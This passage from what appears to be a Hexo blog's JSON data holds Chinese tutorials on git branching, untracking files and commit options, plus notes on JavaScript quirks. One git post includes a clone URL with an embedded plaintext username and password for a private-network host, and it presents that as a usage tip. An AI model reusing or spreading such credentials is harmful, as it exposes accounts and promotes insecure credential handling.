checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch dev    </span><br><span class=\"line\">git checkout dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>本地当前分支</code>，分支前面带<code>&quot;*&quot;</code>表示当前分支，剩下的分支表示本地有的分支：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看<code>远程全部分支</code>，白色的表示本地有的，红色的表示本地没有，仅在远程存在：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>修改代码、提交代码(当前的操作是在dev分支上进行)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add a.html</span><br><span class=\"line\">git commit -m &quot;提交文件a.html&quot;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>分支合并(将dev合并到master)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master     </span><br><span class=\"line\">git merge dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d dev</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>删除后，查看分支(此时看不到dev分支了)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>总结 ：工作中经常从<code>master</code>创建新分支，具体操作如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master   </span><br><span class=\"line\">git checkout -b  issues1234   </span><br><span class=\"line\">git push origin issues1234   </span><br><span class=\"line\">git add ..  </span><br><span class=\"line\">git commit -m &quot;***&quot;</span><br><span class=\"line\">git push origin issues1234</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>注意：将本地分支branch1推到远端的branch2操作步骤：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin branch1:branch2</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ol>\n<li><p>删除分支</p>\n<p>git branch -D issues1234 // 本地强制删除分支 issues1234    </p>\n<p>git push origin  :issues1234  //推到远程</p>\n</li>\n</ol>\n"},{"title":"git 删除远程文件/目录","date":"2018-04-28T08:27:48.000Z","archives":"版本控制","_content":"# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","source":"_posts/GIT/git-删除远程文件-目录.md","raw":"---\ntitle: git 删除远程文件/目录\ndate: 2018-04-28 16:27:48\ntags: git 删除\narchives: 版本控制\ncategories: git\n---\n# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","slug":"GIT/git-删除远程文件-目录","published":1,"updated":"2018-05-05T01:18:18.310Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nax000mr8xjz01wtm7b","content":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n"},{"title":"JS常见陷阱","date":"2018-05-05T02:36:51.000Z","archives":"JS","_content":"# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","source":"_posts/JS/JS常见陷阱.md","raw":"---\ntitle: JS常见陷阱\ndate: 2018-05-05 10:36:51\ntags: JS常见坑\narchives: JS\ncategories: JS\n---\n# JavaScript中8个常见的陷阱\n## 1. 数组元素排序\nJavaScript默认使用`字典序(alphanumeric)`来排序。因此，`[1,2,5,10].sort()`的结果是`[1, 10, 2, 5]`。\n\n如果你想正确的排序，应该这样做：`[1,2,5,10].sort((a, b) => a - b)`\n\n## 2. new Date()\n`new Date()`的使用方法有：\n+ 不接收任何参数：返回当前时间；\n+ 接收一个参数x: 返回1970年1月1日 + x毫秒的值。\n+ new Date(1, 1, 1)返回1901年2月1号。\n+ new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。\n\n## 3. 替换函数(replace)\n\n    let s = \"bob\"\n    const replaced = s.replace('b', 'l')\n    replaced === \"lob\" // 只会替换掉第一个b\n    s === \"bob\" // 并且s的值不会变  \n\n如果想把所有`b`都替换掉，要使用正则：\n\n    \"bob\".replace(/b/g, 'l') === 'lol'\n\n## 4. 谨慎对待比较运算\n  // 这些可以\n  'abc' === 'abc' // true\n  1 === 1         // true\n  // 然而这些不行\n  [1,2,3] === [1,2,3] // false\n  {a: 1} === {a: 1}   // false\n  {} === {}           // false\n\n  因为`[1,2,3]`和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。\n\n","slug":"JS/JS常见陷阱","published":1,"updated":"2018-05-05T09:35:46.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nay000nr8xjv1uh8kzc","content":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JavaScript中8个常见的陷阱\"><a href=\"#JavaScript中8个常见的陷阱\" class=\"headerlink\" title=\"JavaScript中8个常见的陷阱\"></a>JavaScript中8个常见的陷阱</h1><h2 id=\"1-数组元素排序\"><a href=\"#1-数组元素排序\" class=\"headerlink\" title=\"1. 数组元素排序\"></a>1. 数组元素排序</h2><p>JavaScript默认使用<code>字典序(alphanumeric)</code>来排序。因此，<code>[1,2,5,10].sort()</code>的结果是<code>[1, 10, 2, 5]</code>。</p>\n<p>如果你想正确的排序，应该这样做：<code>[1,2,5,10].sort((a, b) =&gt; a - b)</code></p>\n<h2 id=\"2-new-Date\"><a href=\"#2-new-Date\" class=\"headerlink\" title=\"2. new Date()\"></a>2. new Date()</h2><p><code>new Date()</code>的使用方法有：</p>\n<ul>\n<li>不接收任何参数：返回当前时间；</li>\n<li>接收一个参数x: 返回1970年1月1日 + x毫秒的值。</li>\n<li>new Date(1, 1, 1)返回1901年2月1号。</li>\n<li>new Date(2016, 1, 1)不会在1900年的基础上加2016，而只是表示2016年。</li>\n</ul>\n<h2 id=\"3-替换函数-replace\"><a href=\"#3-替换函数-replace\" class=\"headerlink\" title=\"3. 替换函数(replace)\"></a>3. 替换函数(replace)</h2><pre><code>let s = &quot;bob&quot;\nconst replaced = s.replace(&apos;b&apos;, &apos;l&apos;)\nreplaced === &quot;lob&quot; // 只会替换掉第一个b\ns === &quot;bob&quot; // 并且s的值不会变  \n</code></pre><p>如果想把所有<code>b</code>都替换掉，要使用正则：</p>\n<pre><code>&quot;bob&quot;.replace(/b/g, &apos;l&apos;) === &apos;lol&apos;\n</code></pre><h2 id=\"4-谨慎对待比较运算\"><a href=\"#4-谨慎对待比较运算\" class=\"headerlink\" title=\"4. 谨慎对待比较运算\"></a>4. 谨慎对待比较运算</h2><p>  // 这些可以<br>  ‘abc’ === ‘abc’ // true<br>  1 === 1         // true<br>  // 然而这些不行<br>  [1,2,3] === [1,2,3] // false<br>  {a: 1} === {a: 1}   // false<br>  {} === {}           // false</p>\n<p>  因为<code>[1,2,3]</code>和[1,2,3]是两个不同的数组，只是它们的元素碰巧相同。因此，不能简单的通过===来判断。</p>\n"},{"title":"git日常","date":"2018-05-04T03:07:12.000Z","_content":"# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能","source":"_posts/GIT/git日常.md","raw":"---\ntitle: git日常\ndate: 2018-05-04 11:07:12\ntags:\n---\n# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能","slug":"GIT/git日常","published":1,"updated":"2018-05-08T02:34:02.221Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nb0000or8xjiskxam0l","content":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n"},{"title":"怪异的JS系列","date":"2018-05-05T09:50:36.000Z","archives":"JS特殊情况","_content":"# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    \n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","source":"_posts/怪异的JS.md","raw":"---\ntitle: 怪异的JS系列\ndate: 2018-05-05 17:50:36\ntags: JS特殊情况判断\narchives: JS特殊情况\ncategories: JS\n---\n# [怪异的JavaScript系列(一)](https://juejin.im/post/5ade89db6fb9a07aab297b15)\n## [ ]等于![ ]\n    [] == ![] // -> true\n\n**相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。**\n\n因为`[]`和`![]`都会转换为`0`。我们可以理解`[]`是一个`数组`，只不过`为空`而已，那么为`true`。右侧`![]`则为`false`。`false`然后转换为数字`0`。`左侧[]`直接`转`换为`数字`，因为`空数组`会转换`为0`，所以尽管我们认为[]为true，这里却变成了0。\n简算过程:\n````\n+[] == +![]\n0 == +false\n0 == 0\ntrue\n````\n\n## true 是 false\n    !!'false' ==  !!'true'  // -> true\n    !!'false' === !!'true' // -> true\n\n**true是一个真值，用1表示；`字符串的“true”则为NaN`。**\n\n    true == 'true'    // -> false\n    false == 'false'  // -> false\n\n**'false'是一个有意义的字符串。**\n\n## baNaNa\n    'b' + 'a' ++ 'a' + 'a' // -> baNaNa\n\n**这是一个旧笑话，不过改进过的。原始的长这样：**\n\n    'foo' ++ 'bar' // -> 'fooNaN'\n\n该表达式以`'foo' + (+'bar')`的形式计算，因为`bar不是数字`，所以转换为`NaN`。    \n\n## NaN不等于NaN\n    NaN === NaN // -> false\n\n根据 === 的算法，我们可以容易理解为什么为false。\n\n## fail\n    (![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -> fail\n\n如果我们仔细观察序列的规律，会发现下面的模式出现很多次：\n\n    (![]+[]) // -> 'false'\n    ![]      // -> false    